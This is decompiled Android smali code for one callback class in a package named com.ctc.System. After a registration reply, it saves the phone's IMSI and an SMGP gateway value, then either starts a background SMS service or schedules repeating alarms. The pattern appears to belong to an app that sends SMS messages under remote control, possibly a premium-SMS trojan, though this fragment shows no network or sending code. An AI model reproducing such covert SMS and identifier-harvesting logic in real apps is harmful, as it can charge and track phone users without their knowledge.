.class final Lcom/ctc/System/q;
.super Ljava/lang/Object;

# interfaces
.implements Lcom/ctc/c/o;


# instance fields
.field final synthetic a:Lcom/ctc/System/RegisterService;


# direct methods
.method constructor <init>(Lcom/ctc/System/RegisterService;)V
    .locals 0

    iput-object p1, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final a(Ljava/lang/Object;)V
    .locals 9

    const/4 v8, 0x0

    const/4 v1, 0x1

    if-nez p1, :cond_0

    iget-object v0, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-virtual {v0}, Lcom/ctc/System/RegisterService;->stopSelf()V

    :goto_0
    return-void

    :cond_0
    iget-object v0, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v0}, Lcom/ctc/System/RegisterService;->b(Lcom/ctc/System/RegisterService;)Lcom/ctc/c/n;

    move-result-object v0

    const-string v2, "RegisterTime"

    invoke-static {}, Lcom/ctc/c/h;->a()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Lcom/ctc/c/n;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    iget-object v2, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    const-class v3, Lcom/ctc/System/PushAPPService;

    invoke-direct {v0, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v2, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v2}, Lcom/ctc/System/RegisterService;->b(Lcom/ctc/System/RegisterService;)Lcom/ctc/c/n;

    move-result-object v2

    const-string v3, "PushAPPService_TriggerType"

    const-string v4, "Data"

    invoke-virtual {v2, v3, v4}, Lcom/ctc/c/n;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v2, v8, v0, v8}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    iget-object v0, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    const-string v2, "alarm"

    invoke-virtual {v0, v2}, Lcom/ctc/System/RegisterService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    :try_start_0
    invoke-virtual {v0, v6}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    check-cast p1, Lorg/json/JSONObject;

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const-string v3, "code"

    const-string v4, ""

    invoke-virtual {p1, v3, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "SMGP"

    const-string v5, ""

    invoke-virtual {p1, v4, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "msg"

    const-string v7, ""

    invoke-virtual {p1, v5, v7}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v3, v2, v8

    aput-object v4, v2, v1

    const/4 v3, 0x2

    aput-object v5, v2, v3

    const-string v3, "00"

    aget-object v4, v2, v8

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    iget-object v3, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v3}, Lcom/ctc/System/RegisterService;->c(Lcom/ctc/System/RegisterService;)V

    iget-object v3, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v3}, Lcom/ctc/System/RegisterService;->b(Lcom/ctc/System/RegisterService;)Lcom/ctc/c/n;

    move-result-object v3

    const-string v4, "IMSI"

    iget-object v5, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v5}, Lcom/ctc/b/a;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lcom/ctc/c/n;->a(Ljava/lang/String;Ljava/lang/String;)V

    aget-object v3, v2, v1

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_2

    iget-object v0, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v0}, Lcom/ctc/System/RegisterService;->b(Lcom/ctc/System/RegisterService;)Lcom/ctc/c/n;

    move-result-object v0

    sget-object v3, Lcom/ctc/c/g;->h:Ljava/lang/String;

    new-array v4, v1, [Ljava/lang/String;

    const-string v5, "0"

    aput-object v5, v4, v8

    invoke-virtual {v0, v3, v4}, Lcom/ctc/c/n;->a(Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/ctc/c/g;->h:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "MyConstant.SMGP_CACHE in Register: "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Lcom/ctc/c/g;->h:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "dataSMGP[1] in Register: "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v3, v2, v1

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    aget-object v0, v2, v1

    sput-object v0, Lcom/ctc/c/g;->h:Ljava/lang/String;

    iget-object v0, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v0}, Lcom/ctc/System/RegisterService;->b(Lcom/ctc/System/RegisterService;)Lcom/ctc/c/n;

    move-result-object v0

    const-string v1, "SMGP"

    sget-object v2, Lcom/ctc/c/g;->h:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lcom/ctc/c/n;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v0}, Lcom/ctc/System/RegisterService;->b(Lcom/ctc/System/RegisterService;)Lcom/ctc/c/n;

    move-result-object v0

    const-string v1, "PUSH_NEXT"

    const-string v2, "sms"

    invoke-virtual {v0, v1, v2}, Lcom/ctc/c/n;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    const-class v2, Lcom/ctc/System/SMSService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v1, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-virtual {v1, v0}, Lcom/ctc/System/RegisterService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_1
    :goto_2
    iget-object v0, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-virtual {v0}, Lcom/ctc/System/RegisterService;->stopSelf()V

    goto/16 :goto_0

    :cond_2
    iget-object v2, p0, Lcom/ctc/System/q;->a:Lcom/ctc/System/RegisterService;

    invoke-static {v2}, Lcom/ctc/b/a;->c(Landroid/content/Context;)J

    move-result-wide v4

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    add-long/2addr v2, v4

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    goto :goto_2

    :catch_0
    move-exception v2

    goto/16 :goto_1
.end method
